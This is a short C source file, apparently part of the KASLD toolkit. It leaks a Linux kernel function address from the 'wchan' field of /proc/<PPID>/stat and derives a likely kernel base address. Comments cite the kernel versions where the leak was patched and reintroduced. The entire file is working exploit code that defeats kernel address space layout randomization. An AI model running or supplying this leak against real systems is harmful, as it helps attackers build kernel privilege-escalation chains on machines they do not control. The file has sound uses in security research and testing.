// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak the parent process waiting kernel function virtual address
// from /proc/<PPID>/stat wait channel 'wchan' field.
//
// Patched in kernel v4.4-rc1~160 on 2015-10-01:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b2f73922d119686323f14fbbe46587f863852328
//
// Partially reintroduced in kernel v5.12-rc1-dontuse~27^2~35 on 2021-02-25:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/fs/proc/base.c?id=152c432b128cb043fc107e8f211195fe94b2159c
//
// Regression was later reverted in kernel v5.16-rc1~197^2~21 on 2021-10-15:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/fs/proc/base.c?id=54354c6a9f7fd5572d2b9ec108117c4f376d4d23
//
// References:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b2f73922d119686323f14fbbe46587f863852328
// https://www.cr0.org/paper/to-jt-linux-alsr-leak.pdf
// https://marcograss.github.io/security/linux/2016/01/24/exploiting-infoleak-linux-kaslr-bypass.html
// ---
// <bcoles@gmail.com>

#include "kasld.h"
#include <errno.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

unsigned long get_kernel_addr_proc_stat_wchan() {
  FILE *f;
  char path[32];
  unsigned long addr = 0;
  char buff[BUFSIZ];
  char delim[] = " ";
  char *ptr;
  char *endptr;

  snprintf(path, sizeof(path), "/proc/%d/stat", (pid_t)getppid());

  printf("[.] checking %s 'wchan' field ...\n", path);

  f = fopen(path, "rb");
  if (f == NULL) {
    perror("[-] fopen");
    return 0;
  }

  if (fgets(buff, BUFSIZ, f) == NULL) {
    perror("[-] fgets");
    return 0;
  }

  ptr = strtok(buff, delim);
  while ((ptr = strtok(NULL, delim)) != NULL) {
    addr = strtoul(&ptr[0], &endptr, 10);

    if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
      break;

    addr = 0;
  }

  fclose(f);

  return addr;
}

int main() {
  unsigned long addr = get_kernel_addr_proc_stat_wchan();
  if (!addr)
    return 1;

  printf("leaked wchan address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);

  return 0;
}
